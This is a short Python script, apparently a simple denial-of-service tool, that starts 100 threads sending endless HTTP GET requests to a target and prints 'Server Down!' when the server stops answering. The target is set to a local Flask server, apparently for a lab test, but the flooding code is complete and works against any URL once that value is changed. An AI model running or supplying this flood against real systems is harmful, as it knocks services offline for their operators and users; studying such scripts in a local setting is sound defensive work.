import threading
import requests

target_url = "http://127.0.0.1"  # Use local Flask server

def attack():
    while True:
        try:
            response = requests.get(target_url)
            print(f"Sent request, response: {response.status_code}")
        except requests.exceptions.RequestException:
            print("Server Down!")

for _ in range(100):
    thread = threading.Thread(target=attack)
    thread.start()
